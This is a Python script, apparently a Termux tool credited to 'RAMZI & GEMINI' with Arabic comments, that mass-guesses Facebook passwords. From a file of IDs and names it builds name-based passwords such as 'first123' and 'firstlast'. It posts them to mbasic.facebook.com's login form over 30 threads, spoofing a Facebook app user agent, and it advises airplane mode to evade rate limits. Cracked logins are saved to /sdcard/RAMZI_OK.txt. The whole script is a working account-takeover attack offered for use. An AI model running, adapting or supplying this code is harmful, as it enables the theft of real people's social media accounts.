#─━─━─━─━─━─━─━─━─━─━#BY RAMZI & GEMINI#─━─━─━─━─━─━─━─━─━─━#    
import os,sys,time,re,uuid,base64,zlib,subprocess
from concurrent.futures import ThreadPoolExecutor as tpe
import random
import requests,json,string
from bs4 import BeautifulSoup as sop

# هذي هي الهوية تاعك لي جبناها من جوجل (User Agent)
MY_UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36"

def clear():
    os.system('clear')
    print(logo)

# تعديل الميثود باش تخدم بالهوية تاعك
def SEJADUA():
    # نخلطو الـ UA تاعك مع بصمات فيسبوك باش نخدعوه
    ua = f"{MY_UA} [FBAN/FB4A;FBAV/{str(random.randint(400,450))}.0.0.{str(random.randint(10,99))};FBBV/{str(random.randint(100000000,999999999))};FBDM/{{density=3.0,width=1080,height=1920}};FBLC/fr_DZ;FBCR/Mobilis;FBMF/samsung;FBBD/samsung;FBPV/com.facebook.katana;FBDV/SM-G973F;FBSV/10;FBCA/arm64-v8a:;]"
    return ua

#─━─━─━─━─━─━─━─━─━─━#LOGO & SETUP#─━─━─━─━─━─━─━─━─━─━#
H = '\033[1;32m'
N = '\x1b[1;37m'
logo = (f"""{H}
 █████  ██    ██  ██████  ██████  ██████  
██   ██  ██  ██  ██    ██ ██   ██ ██   ██ 
███████   ████   ██    ██ ██████  ██████  
██   ██    ██    ██    ██ ██   ██ ██   ██ 
██   ██    ██     ██████  ██   ██ ██   ██ 
{N}<======================================> 
 <=> DEVLOPER  <=>  RAMZI X GEMINI 
 <=> VERSION   <=>  RAMZI-SPECIAL-V1
<======================================> """)

loop = 0
oks = []
cps = []
pcp = []

def menu():
    clear()
    print(' [1] File Cloning (Mbasic Method)')
    print(' [0] Exit ')
    xd = input(' [?] Chose : ')
    if xd in ['1', '01']:
        clear()
        file = input(' [>] Put file path : ')
        try:
            fo = open(file, 'r').read().splitlines()
        except:
            print(' File not found! '); time.sleep(2); menu()
        
        clear()
        print(' [1] Auto Password')
        ppp = input(' [?] Chose : ')
        plist = ['first123', 'first1234', 'first12345', 'firstlast', 'first000', 'first111']
        
        clear()
        print(' [?] Show CP ID? (y/n) ')
        cx = input(' [?] Chose : ')
        if cx in ['y', 'Y']: pcp.append('y')
        else: pcp.append('n')
        
        with tpe(max_workers=30) as crack_submit:
            clear()
            print(f' TOTAL IDS : {len(fo)}')
            print(" USE AIRPLANE MODE EVERY 5 MINS")
            print(" <======================================>")
            for user in fo:
                ids, names = user.split('|')
                crack_submit.submit(api_mbasic, ids, names, plist)
        
        print('\n <======================================>')
        print(f' OK/CP: {len(oks)}/{len(cps)}')
        input(' Press Enter to back ')
        menu()

# ميثود Mbasic المحدثة (أقوى في الصيد)
def api_mbasic(ids, names, passlist):
    global loop, oks, cps
    sys.stdout.write(f'\r [RAMZI-XD] {loop}|OK:{len(oks)}|CP:{len(cps)} '); sys.stdout.flush()
    fn = names.split(' ')[0].lower()
    try: ln = names.split(' ')[1].lower()
    except: ln = fn
    
    for pw in passlist:
        pas = pw.replace('first', fn).replace('last', ln).replace('Name', names)
        session = requests.Session()
        # هنا السكربت يخدم بـ User Agent تاعك
        headers = {
            'authority': 'mbasic.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
            'user-agent': MY_UA,
        }
        try:
            # صيد التوكينات تلقائياً
            res = session.get("https://mbasic.facebook.com/login.php", headers=headers).text
            payload = {
                "lsd": re.search('name="lsd" value="(.*?)"', res).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', res).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', res).group(1),
                "li": re.search('name="li" value="(.*?)"', res).group(1),
                "email": ids,
                "pass": pas,
                "login": "Log In"
            }
            post = session.post("https://mbasic.facebook.com/login.php", data=payload, headers=headers, allow_redirects=False)
            if "c_user" in session.cookies.get_dict():
                print(f'\r\r\033[1;32m [RAMZI-OK] {ids} | {pas} \033[1;97m')
                oks.append(ids)
                open('/sdcard/RAMZI_OK.txt', 'a').write(ids+'|'+pas+'\n')
                break
            elif "checkpoint" in session.cookies.get_dict():
                if 'y' in pcp:
                    print(f'\r\r\033[1;33m [RAMZI-CP] {ids} | {pas} \033[1;97m')
                cps.append(ids)
                break
        except: pass
    loop += 1

menu()